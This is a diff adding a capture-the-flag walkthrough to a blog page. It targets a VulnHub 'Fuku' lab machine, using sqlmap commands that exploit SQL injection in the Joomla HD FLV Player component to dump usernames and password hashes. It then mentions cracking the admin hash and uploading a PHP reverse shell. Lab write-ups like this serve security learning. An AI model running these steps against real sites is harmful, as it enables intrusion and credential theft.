@@ -127,6 +127,8 @@ $(document).ready(
 <!--more-->
 
 
+<h3>Use Joomla! Remote Admin Chnage Password Exploit</h3>
+
 <p>Use netdiscover to detect target IP address</p>
 
 <p><code>netdiscover -i eth0 -r 192.168.56.0/24</code></p>
@@ -268,6 +270,56 @@ $(document).ready(
 <p><code>sudo su</code></p>
 
 <p><img src="/images/blog/vulhub/fuku/Capture13.JPG" title="[title manually exploit [alt text]]" ></p>
+
+<h3>Exploit Joomla HD FLV Player SQL Injection</h3>
+
+<p>in <a href="http://192.168.56.134/,">http://192.168.56.134/,</a> I found the target uses HD FLV Player</p>
+
+<p><img src="/images/blog/vulhub/fuku/Capture19.JPG" title="[title manually exploit [alt text]]" ></p>
+
+<p>check the source code:</p>
+
+<p><img src="/images/blog/vulhub/fuku/Capture20.JPG" title="[title manually exploit [alt text]]" ></p>
+
+<p><code>searchsploit HD FLV</code></p>
+
+<p><img src="/images/blog/vulhub/fuku/Capture25.JPG" title="[title manually exploit [alt text]]" ></p>
+
+<p>follow the instructions:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sqlmap -u "http://192.168.56.134:13370/index.php?option=com_hdflvplayer&id=1" -p id --dbms mysql --tables --level=5 --risk=3</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="/images/blog/vulhub/fuku/Capture21.JPG" title="[title manually exploit [alt text]]" ></p>
+
+<p>now get the columns of the table <code>jos_users</code></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sqlmap -u "http://192.168.56.134:13370/index.php?option=com_hdflvplayer&id=1" -p id --dbms mysql -T jos_users --columns</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="/images/blog/vulhub/fuku/Capture22.JPG" title="[title manually exploit [alt text]]" ></p>
+
+<p>now I am interested in column username and password</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sqlmap -u "http://192.168.56.134:13370/index.php?option=com_hdflvplayer&id=1" -p id --dbms mysql -T jos_users -C username,password --dump</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="/images/blog/vulhub/fuku/Capture23.JPG" title="[title manually exploit [alt text]]" ></p>
+
+<p>The first part should be hash and the second part should be salt. I used joomla password crack tool <a href="https://github.com/wg135/script/blob/master/joomla.pl">joomlacrack</a></p>
+
+<p>crack admin&rsquo;s password now</p>
+
+<p><img src="/images/blog/vulhub/fuku/Capture26.JPG" title="[title manually exploit [alt text]]" ></p>
+
+<p>% img  /images/blog/vulhub/fuku/Capture24.JPG   [title manually exploit [alt text]] %}</p>
+
+<p>Then login as admin, upload php reverse shell, same as I worked in the first part of this post.</p>
+
+<p>DONE</p>
 </div>
 
 
